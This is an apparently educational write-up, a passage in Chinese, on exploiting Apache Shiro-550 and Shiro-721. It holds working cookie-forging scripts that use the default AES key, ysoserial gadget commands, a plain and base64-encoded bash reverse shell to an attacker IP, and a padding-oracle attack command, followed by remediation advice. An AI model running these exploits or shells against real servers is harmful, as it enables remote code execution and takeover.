<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rememberMe=WM0+3iRZaxl/mYdNM2vyqOvxRiJfMtqkfv2mJX6cLUZQFRnWcS5jVR+e43SeN+yeBoWiVDjFBDSNp5+YGf9y1av27VuG8bYwTOaHkFVkoeFKpJadtV0tAGxcpI9e4il6D9OHH6k7PcJCdtaUnLPGwqnRGGHZjD1M/ZM8KSawiHAfme9rKC0pxijJoMIaz9jSEaOmJnXDzBIAgnSkikJD9s5LO3fpNMHuaHCC8Hqcrna8vn5sEKD1jIlGxugTFWoyMeYQzVvIxhZbs8v5mJfTXFRSVmfH9FrotQqKCJLD3V8WFckEZdMQIYvozXuym1LGix0QaP9F7sjoCvNt953nwYiJHGoiOwpP/V2LjLY60usnFP+Qu+FKRYIjUrcCT6NyasQL4ehTpUZ3uoxp9NYy5sv/MsW5g335odrtzA03LOM0ZDXqHS/aAuPpO74RmN3K7aq3dzOpQrEY7CTfkKLbQjA3Iz9fzSYgxlq7UoXjkp5/E1cr7KRlLqv8Edr9uU0lWb5XU2Thp+mA4RlRbYetAg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-remember-cookie.png" alt="550-remember-cookie"></p>
<ul>
<li><p>假设以admin用户登录，登录成功的情况下，shiro会先将admin字符串进行序列化，使用DefaultSerializer类的serialize类的serizlize方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals); <span class="comment">// 进行序列化</span></span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes); <span class="comment">// AES加密</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>处理Cookie的类  -&gt;  CookieRememberMeManaer</p>
<ul>
<li>继承AbstractRememberMeManager类</li>
</ul>
</li>
<li><p>跟进AbstractRememberMeManager类  -&gt; 从onSuccessfulLogin方法下断点，debug就可以看到逻辑</p>
<ul>
<li>很容易看到AES的Key</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>encrypt方法中，AES的模式为AES/CBC/PKCS5Padding，并且并且AES的key为    <code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>，转换为16进制后是<code>\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68</code>，key为16字节，128位</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>进行AES加密，利用arraycopy()方法将随机的16字节IV放到序列化后的数据前面，完成后再进行AES加密。最后在CookieRememberMeManager类的rememberSerializedIdentity()方法中进行base64加密</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String base64 = Base64.encodeToString(serialized);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="漏洞解析分析"><a href="#漏洞解析分析" class="headerlink" title="漏洞解析分析"></a>漏洞解析分析</h5><ul>
<li>通过AES的key，加密模式AES/CBC/PKCS5Padding  -&gt;  加解密密文</li>
<li>获取remmemberMe的Cookie</li>
<li>Base64解码，CookieRememberMeManager类的getRememberedSerializedIdentity()方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br></pre></td></tr></table></figure>

<ul>
<li>AES解密，Base64解码后的字节，减去前面16个字节，使用AbstractRememberMeManager类的decrypt()方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected byte[] decrypt(byte[] encrypted) &#123;</span><br><span class="line">        byte[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        if (cipherService != null) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        return serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>反序列化，使用DefaultSerializer类的deserialize()方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public T deserialize(byte[] serialized) throws SerializationException &#123;</span><br><span class="line">        if (serialized == null) &#123;</span><br><span class="line">            String msg = &quot;argument cannot be null.&quot;;</span><br><span class="line">            throw new IllegalArgumentException(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = new BufferedInputStream(bais);</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);</span><br><span class="line">            @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span><br><span class="line">            T deserialized = (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            return deserialized;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            String msg = &quot;Unable to deserialze argument byte array.&quot;;</span><br><span class="line">            throw new SerializationException(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ readObjetc方法，由于反序列化的对象完全由外部rememberMe Cookie控制。所以，一旦添加了有漏洞的包或者库如common-collections包，就会造成任意命令执行</li>
</ul>
<h5 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h5><ul>
<li><a href="https://github.com/frohoff/ysoserial.git" target="_blank" rel="noopener">ysoserial</a></li>
<li><a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">Shiro_exploit</a>_</li>
</ul>
<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><ul>
<li>检测是否存在默认的key，使用Shiro_exploit来获取key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python shiro_exploit.py -u http://you_ip:8080</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-aes-key.png" alt="550-aes-key"></p>
<ul>
<li><p>可通过Burpsuite的Burp Collaborator Client进行DNSlog测试(默认会有TTL缓存机制，默认10s)</p>
<ul>
<li>先生成一个Payload，Copy to clipboar进行复制</li>
<li>通过shiro.py脚本进行生成需要的payload</li>
<li>放入Cookie中进行重放  -&gt;  可以发现回包有两个Remember=DeleteMe</li>
<li>在Burp Collaborator Client中点击Poll now查看是否有回显信息</li>
<li>▲ 这里因为脚本的原因，暂无法编译出payload，借用一些大佬的图片</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-dnslog.png" alt="550-burp-dnslog"></p>
</li>
</ul>
<h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><ul>
<li>首先通过shiro_exp_payload.py生成的payload访问攻击端口6666</li>
<li>端口6666攻击机通过CommonsCollections5执行系统命令反弹shell给需要反弹的机器（这里还是攻击机不过端口是9999）</li>
</ul>
<h5 id="漏洞利用一"><a href="#漏洞利用一" class="headerlink" title="漏洞利用一"></a>漏洞利用一</h5><ul>
<li><p>制作反弹shell</p>
<ul>
<li><p>监听本地端口<code>nc -nvlp 9999</code></p>
</li>
<li><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Java Runtime</a> 配合bash编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.71.47/9999 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-runtime-bash.png" alt="550-java-runtime-bash"></p>
</li>
</ul>
</li>
<li><p>通过ysoserial的JRMP监听模块，监听6666端口并执行反弹shell命令</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &apos;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcxLjQ3Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;</span><br><span class="line"></span><br><span class="line">▲ Window下单引号需改为双引号，不然会报错</span><br></pre></td></tr></table></figure>

<ul>
<li>使用shiro.py生成payload（借用大佬的shiro.py脚本）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python shiro.py 192.168.71.47:6666</span><br><span class="line"></span><br><span class="line">Payload:rememberMe=uCkSNSu3SJ65fQlfsjIhZ3Jsa+mLKp0grAJZik4iZm4aeWC48j5RFAZBDlFXEwHum5AHRr3n0JeI+QyUwYwjbXv3iA5zw8D9Ny6PWcndXnQa1+eDxaiEpGtYuRw92gd6MQeHTqh34/tOM0GLYcgzltFikbLgmA2y0SED1Bsz4UsCWn846cWh37JcRk2V+zMB1m8hdSxhtv3mqtuyRoFntAiHmMV8T1LHZd7JBfjZz0+uSol36u6lO6ZZdDIHcqishUTxxeiOlSUcqnbWNKI2nveEyxVNQKJ9gXyAI93zvANYHFI6UTAoYoPLIkViaB0H1Y20JEhZ7knsCEjd8zrezo7xUjPZzh9ZRB6ZR+67b5O2JH/T9rjRh+3vX6HznQZ17YtLON1EMoByXdyoR/pP9Q==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-crypto-data.png" alt="550-crypto-data"></p>
<ul>
<li>构造数据包，伪造cookie，发送Payload</li>
</ul>
<p><img src="/images/middleware/shiro/550-cookie-payload.png" alt="550-cookie-payload"></p>
<ul>
<li>nc监听，反弹拿到shell</li>
</ul>
<p><img src="/images/middleware/shiro/550-shiro-550-shell.png" alt="550-shiro-550-shell"></p>
<ul>
<li>补充，另一个大佬的脚本，一样的原理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = &apos;/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(url, rce_command):</span><br><span class="line">    if &apos;://&apos; not in url:</span><br><span class="line">        target = &apos;https://%s&apos; % url if &apos;:443&apos; in url else &apos;http://%s&apos; % url</span><br><span class="line">    else:</span><br><span class="line">        target = url</span><br><span class="line">    try:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  # 生成payload</span><br><span class="line">        r = requests.get(target, cookies=&#123;&apos;rememberMe&apos;: payload.decode()&#125;, timeout=10)  # 发送验证请求</span><br><span class="line">        print r.text</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generator(command, fp):</span><br><span class="line">    if not os.path.exists(fp):</span><br><span class="line">        raise Exception(&apos;jar file not found!&apos;)</span><br><span class="line">    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, fp, &apos;CommonsCollections2&apos;, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    poc(&apos;http://127.0.0.1:8080&apos;, &apos;open /Applications/Calculator.app&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="漏洞利用二"><a href="#漏洞利用二" class="headerlink" title="漏洞利用二"></a>漏洞利用二</h5><ul>
<li>生成poc.ser文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"touch /tmp/success"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure>

<ul>
<li>使用之前的AES密钥对Payload进行加密，使用Java的POC</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译生成最后的RememberMe，需要shiro-core的jar包以及slf4j-api的包</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-java-cookie-poc.png" alt="550-java-cookie-poc"></p>
<ul>
<li>发送rememberMe Cookie，即可成功执行命令</li>
</ul>
<p><img src="/images/middleware/shiro/550-burp-cookie-poc-ser.png" alt="550-burp-cookie-poc-ser"></p>
<p><img src="/images/middleware/shiro/550-tmp-succsee.png" alt="550-tmp-succsee"></p>
<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ul>
<li><p>▲ 无论是否升级shiro到1.2.5及以上，如果shiro的rememberMe功能的AES密钥一旦泄露，就会导致反序列化漏洞</p>
</li>
<li><p>官方修复</p>
<ul>
<li>删除代码里的默认密钥</li>
<li>默认配置里注释了默认密钥</li>
<li>如果不配置密钥，每次会重新随机一个密钥</li>
<li>▲ 可以看到并没有对反序列化做安全限制，只是在逻辑上对该漏洞进行了处理。如果在配置里自己单独配置AES的密钥，并且密钥一旦泄露，那么漏洞依然存在</li>
</ul>
</li>
<li><p>漏洞修复的方案同时进行：</p>
<ul>
<li>升级shiro到1.2.5及以上</li>
<li>如果在配置里配置了密钥，请利用官方提供的方法生成密钥：\org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenerateCipherKey</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 随机生成秘钥，参考org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generateNewKey() &#123;</span><br><span class="line">        KeyGenerator kg;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            kg = KeyGenerator.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var5) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to acquire AES algorithm.  This is required to function."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(msg, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kg.init(<span class="number">128</span>);</span><br><span class="line">        SecretKey key = kg.generateKey();</span><br><span class="line">        <span class="keyword">byte</span>[] encoded = key.getEncoded();</span><br><span class="line">        <span class="keyword">return</span> encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h5 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h5><ul>
<li>升级Shiro到最新版本</li>
<li>WAF拦截Cookie中长度过大的rememberMe值</li>
</ul>
<h3 id="0X01-Shiro-Padding-Oracle-Attack-Shiro-721"><a href="#0X01-Shiro-Padding-Oracle-Attack-Shiro-721" class="headerlink" title="0X01 Shiro Padding Oracle Attack(Shiro-721)"></a>0X01 Shiro Padding Oracle Attack(Shiro-721)</h3><blockquote>
<p>CVE-2019-12422</p>
</blockquote>
<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><ul>
<li>由于Shiro Cookie中通过AES-128-CBC模式加密rememberMe字段存在问题，用过可通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行序列化攻击，导致任意代码执行</li>
</ul>
<h5 id="Padding-Oracle-Attack攻击分析"><a href="#Padding-Oracle-Attack攻击分析" class="headerlink" title="Padding Oracle Attack攻击分析"></a>Padding Oracle Attack攻击分析</h5><ul>
<li>▲ 关键思路在于通过构造IV值（也就是前一组密文）利用服务器的返回值结合PKCS #5来找到正确的中间值，从而绕过加密算法，直接得到解密后的内容</li>
<li>主要是通过服务器的返回值来判断自己的构建的IV值是否正确，进而猜测初正确的中间值IV值，中间值IV再和 获取到的原来的IV值异或便可得到明文，攻击有两个重要的假设前提<ul>
<li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV值（初始化向量）</li>
<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果</li>
</ul>
</li>
<li>能够 获得密文我们才能得到正确的明文，而密文的第一组分组 需要有正确的初始向量才能解密。能触发密文的解密过程才能在不知道密钥的情况下绕过加密算法直接得到我们想要的结果，而知道密文的解密结果是通过服务器返回值来判断结果是不是符合填充标准来实现的</li>
</ul>
<h5 id="影响版本：Apache-Shiro-lt-1-4-2版本"><a href="#影响版本：Apache-Shiro-lt-1-4-2版本" class="headerlink" title="影响版本：Apache Shiro &lt; 1.4.2版本"></a>影响版本：Apache Shiro &lt; 1.4.2版本</h5><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li>登录Shiro网站，从Cookie中获取rememberMe字段值</li>
</ul>
<p><img src="/images/middleware/shiro/721-remember-cookie.png" alt="721-remember-cookie"></p>
<ul>
<li>利用DNSlog探测，通过ysoserial生成payload</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"ping cedp8j.dnslog.cn"</span> &gt; payload.class</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/721-dnslog-payload.png" alt="721-dnslog-payload"></p>
<ul>
<li>使用rememberMe值作为prefix，加载Payload，进行<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">Padding Oracle</a>攻击</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br><span class="line"></span><br><span class="line">java -jar PaddingOracleAttack.jar http://192.168.67.153:8080/ quT6mlx30kPSeU+sXkH2wXE9d5oWVXkhToumO+4+tICqaWkpBq77H2AFuWz5t7JNHXXre0UfVXFpvk7vjfolR1EkJNftIFLHZ26+cPikj3mp6V2AgEzcyHdgJ/UVaDSyUxNrxpnLpjlfxe1V7X3MCroxSkis6Y/uB2BIN9M4p8mp50RMzlIxOSBNtMY9sJOb48eAo8OO4aTvzMKsFyzaO0fTwcueNxCJqiCdgovpj8vrp3R1CpRIeHwq7ldVBio95bI1Twtuv+Gy6kNDLsV41aeL0RM2tqp2XVgzTQ+Hi3H4kzF2/dzLU7M5Mg7g94uggu/NnV7HCYTX6SYHTRaH729JCEe2OFkYtwVEKk9s9cOxSPxIoLVRSgAZwKRO3CByEqAxm3L4MmuORAgorZf15DC0X1/OeFixLBN85LxitUwOtmFUidnWQQI/YaJDYxOU1+6HITJhHNgpMIKm3P46n06l302+k1vagcIl1BaresGoN93ahagQe2To/Tj33/EyAfVG0NbCu0Olp89aWzTxIw== 16 payload.class</span><br></pre></td></tr></table></figure>

<ul>
<li>爆破成功，输出Result</li>
</ul>
